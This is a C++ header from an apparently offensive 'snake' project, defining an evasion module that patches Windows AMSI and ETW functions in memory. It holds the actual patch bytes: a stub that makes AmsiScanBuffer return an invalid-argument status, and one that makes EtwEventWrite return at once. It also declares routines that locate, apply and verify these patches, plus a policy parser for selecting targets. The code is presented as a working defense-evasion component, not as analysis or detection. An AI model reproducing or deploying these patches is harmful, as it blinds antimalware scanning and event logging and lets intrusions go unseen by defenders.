#ifndef SNAKE_EVADE_HPP
#define SNAKE_EVADE_HPP

#include <cstddef>
#include <cstdint>
#include <string>

#include "snake/stealth.hpp"
#include "snake/winstealth.hpp"

namespace snake {
namespace evade {

enum class Target : std::uint32_t { amsi = 0, etw = 1, Count };

inline constexpr std::uint8_t kAmsiPatch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
inline constexpr std::size_t kAmsiPatchLen = sizeof(kAmsiPatch);
inline constexpr std::uint8_t kEtwPatch[] = {0x33, 0xC0, 0xC3};
inline constexpr std::size_t kEtwPatchLen = sizeof(kEtwPatch);

inline constexpr std::uint32_t kAmsiScanBufferStatus = 0x80070057u;
inline constexpr std::uint32_t kEtwEventWriteStatus = 0;

struct TargetSpec {
    std::string module;
    std::string function;
    const std::uint8_t* patch;
    std::size_t patch_len;
};

TargetSpec target_spec(Target t);
const std::string& target_name(Target t);
bool target_from_name(const std::string& name, Target& out);

struct EvadePolicy {
    bool targets[static_cast<std::size_t>(Target::Count)] = {false, false};

    bool any() const {
        for (bool on : targets) {
            if (on) return true;
        }
        return false;
    }
    bool enabled(Target t) const { return targets[static_cast<std::size_t>(t)]; }
};

bool evade_policy_parse(const std::string& list, EvadePolicy& out, std::string& err);

std::string policy_summary(const EvadePolicy& policy);

struct PatchSite {
    bool found = false;
    std::uint32_t rva = 0;
    std::size_t span_off = 0;
    std::size_t span_len = 0;
    std::string reason;
};

PatchSite locate(winstealth::ImageView image, Target t);

bool patch_image(std::uint8_t* base, std::size_t size, const PatchSite& site, Target t);

bool image_patched(const std::uint8_t* base, std::size_t size, const PatchSite& site, Target t);

#ifdef _WIN32
bool neutralize(Target t);

std::size_t apply(const EvadePolicy& policy);
#endif  // _WIN32

}  // namespace evade
}  // namespace snake

#endif  // SNAKE_EVADE_HPP
